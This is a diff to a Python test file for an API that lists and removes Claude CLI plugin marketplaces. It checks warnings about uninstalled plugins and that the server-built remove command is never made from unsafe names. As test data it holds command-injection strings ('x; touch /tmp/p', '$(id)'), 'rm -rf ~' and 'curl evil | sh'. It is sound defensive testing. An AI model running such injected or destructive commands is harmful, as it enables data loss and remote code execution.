@@ -14,6 +14,7 @@ Mirrors :mod:`test_config_write_mcp_cli`'s layering:
 from __future__ import annotations
 
 import json
+import shlex
 import subprocess
 import sys
 from pathlib import Path
@@ -1119,7 +1120,9 @@ def test_route_marketplaces_list_success(
         resp = c.get("/api/config-write/marketplaces?scope=project&project=alpha")
         assert resp.status_code == 200
         body = resp.json()
-        assert body["marketplaces"] == payload
+        assert body["marketplaces"] == [
+            {**payload[0], "removeCommand": "claude plugin marketplace remove market"}
+        ]
         assert body["project"] == "alpha"  # project scope carries the project key
 
 
@@ -1328,6 +1331,159 @@ def test_route_marketplace_remove_failed_read_is_reported_not_a_400(
     assert resp.status_code == 200
     [warning] = resp.json()["warnings"]
     assert "could not read the marketplace list" in warning
+
+
+@pytest.mark.parametrize("op", ["remove", "update"])
+def test_route_marketplace_read_after_a_commit_survives_a_vanished_binary(
+    write_config, tmp_path, projects_root, monkeypatch, op
+) -> None:
+    # The binary can vanish between the write and the read, for example during an update.
+    # ClaudeNotFound is not a ConfigWriteError, and the write already committed.
+    calls = {"names": 0}
+
+    def names(*_a, **_k):
+        calls["names"] += 1
+        if calls["names"] > 1:
+            raise claude_cli.ClaudeNotFound("claude binary not found")
+        return {}, frozenset()
+
+    def listed(*_a, **_k):
+        raise claude_cli.ClaudeNotFound("claude binary not found")
+
+    monkeypatch.setattr(plugins, "marketplace_plugin_names", names)
+    monkeypatch.setattr(plugins, "marketplace_is_listed", listed)
+    with _client(write_config, tmp_path, _ON) as c:
+        resp = c.post("/api/config-write/marketplaces/action", json={**_REMOVE_MARKET, "op": op})
+    assert resp.status_code == 200
+    if op == "remove":
+        assert "could not read the marketplace list" in resp.json()["warnings"][0]
+    else:
+        assert calls["names"] == 2
+
+
+def test_route_marketplace_remove_names_the_plugins_the_cli_uninstalled(
+    write_config, tmp_path, projects_root, monkeypatch
+) -> None:
+    # TASK-514, CLI 2.1.330: a project-scope Remove can uninstall another project's plugin.
+    monkeypatch.setenv(
+        "FAKE_CLAUDE_PLUGIN_STDOUT",
+        "✔ Successfully removed marketplace: market (from project settings)\n"
+        "Also uninstalled 2 plugins from this marketplace:\n"
+        "  fmt@market\n"
+        "  lint@market\n"
+        "The removal also deletes their saved options, secrets and data where it can.\n"
+        "To use a plugin again, add the marketplace back and reinstall the plugin.\n",
+    )
+    monkeypatch.setenv("FAKE_CLAUDE_PLUGIN_MARKETPLACE_LIST_STDOUT", "[]")
+    with _client(write_config, tmp_path, _ON) as c:
+        resp = c.post("/api/config-write/marketplaces/action", json=_REMOVE_MARKET)
+    assert resp.status_code == 200
+    [warning] = resp.json()["warnings"]
+    assert "uninstalled 2 plugins from this marketplace: fmt@market, lint@market." in warning
+    assert "other projects" in warning
+
+
+@pytest.mark.parametrize(
+    ("stdout", "expected"),
+    [
+        ("Also uninstalled 1 plugin from this marketplace:\n  fmt@m\nDone\n", "1 plugin from"),
+        # An id the validator refuses is never echoed, and the count still reaches the operator.
+        ("Also uninstalled 1 plugin from this marketplace:\n  x; rm -rf ~\n", "1 plugin from"),
+        ("Also uninstalled 2 plugins from this marketplace:\n  fmt@m\n", "2 plugins from"),
+    ],
+)
+def test_uninstalled_warning_names_only_a_complete_valid_list(
+    tmp_path: Path, stdout: str, expected: str
+) -> None:
+    run, _calls = _fake_run(rc=0, stdout=stdout)
+    warning = plugins.cli_marketplace_remove(str(FAKE_CLAUDE), tmp_path, "m", "user", run=run)
+    assert warning is not None and expected in warning
+    assert "rm -rf" not in warning
+    # Named only when the valid lines match the count.
+    assert ("fmt@m" in warning) == (expected == "1 plugin from" and "fmt@m" in stdout)
+
+
+def test_cli_marketplace_remove_without_uninstalls_has_no_warning(tmp_path: Path) -> None:
+    run, _calls = _fake_run(rc=0, stdout="✔ Successfully removed marketplace: m")
+    assert plugins.cli_marketplace_remove(str(FAKE_CLAUDE), tmp_path, "m", "user", run=run) is None
+
+
+def test_cli_marketplace_remove_exit_0_saying_not_declared_is_not_a_404(tmp_path: Path) -> None:
+    run, _calls = _fake_run(rc=0, stdout="note: 'other' is not declared in project settings")
+    assert plugins.cli_marketplace_remove(str(FAKE_CLAUDE), tmp_path, "m", "user", run=run) is None
+
+
+def test_cli_marketplace_remove_not_declared_on_stdout_is_a_404(tmp_path: Path) -> None:
+    run, _calls = _fake_run(rc=1, stdout="Marketplace 'm' is not declared in user settings.")
+    with pytest.raises(plugins.MarketplaceNotFoundError) as exc_info:
+        plugins.cli_marketplace_remove(str(FAKE_CLAUDE), tmp_path, "m", "user", run=run)
+    assert "Make sure that the settings file at that scope is readable" in str(exc_info.value)
+
+
+@pytest.mark.parametrize(
+    "name",
+    [
+        "x; touch /tmp/p",
+        "y`id`",
+        "z$(id)",
+        "a b",
+        "a\n",
+        "a|b",
+        "a&b",
+        "'q'",
+        "-rf",
+        "",
+        None,
+        7,
+    ],
+)
+def test_remove_command_is_none_for_an_unsafe_name(name) -> None:
+    assert plugins.marketplace_remove_command(name) is None
+
+
+@pytest.mark.parametrize("name", ["market", "my_market.v2-beta", "0x"])
+def test_remove_command_for_a_valid_name_needs_no_quoting(name: str) -> None:
+    command = plugins.marketplace_remove_command(name)
+    assert command == f"claude plugin marketplace remove {name}"
+    assert shlex.split(command) == ["claude", "plugin", "marketplace", "remove", name]
+
+
+def test_describe_remove_gives_no_command_for_an_unsafe_name() -> None:
+    warning = plugins.describe_marketplace_remove("x; touch /tmp/p", listed=True)
+    assert warning is not None
+    assert "`claude plugin marketplace remove" not in warning
+    assert "quote the name" in warning
+
+
+def test_route_marketplaces_list_builds_remove_command_on_the_server(
+    write_config, tmp_path, projects_root, monkeypatch
+) -> None:
+    rows = [
+        {"name": "market", "source": "directory", "path": "/srv/m"},
+        {"name": "x; touch /tmp/p", "source": "directory", "path": "/srv/x"},
+        {"name": "y`id`$(id)", "source": "directory", "path": "/srv/y"},
+        # A value in the CLI's own output must never become the command.
+        {"name": "z", "source": "directory", "removeCommand": "curl evil | sh"},
+        {"source": "directory", "path": "/srv/no-name"},
+    ]
+    monkeypatch.setenv("FAKE_CLAUDE_PLUGIN_MARKETPLACE_LIST_STDOUT", json.dumps(rows))
+    with _client(write_config, tmp_path, _ON) as c:
+        resp = c.get("/api/config-write/marketplaces?scope=project&project=alpha")
+    assert resp.status_code == 200
+    assert [m["removeCommand"] for m in resp.json()["marketplaces"]] == [
+        "claude plugin marketplace remove market",
+        None,
+        None,
+        "claude plugin marketplace remove z",
+        None,
+    ]
+
+
+def test_with_remove_commands_keeps_a_non_object_row() -> None:
+    assert plugins.with_remove_commands(["odd", {"name": "m"}]) == [
+        "odd",
+        {"name": "m", "removeCommand": "claude plugin marketplace remove m"},
+    ]
 
 
 def test_route_marketplace_second_remove_never_says_omit_scope(
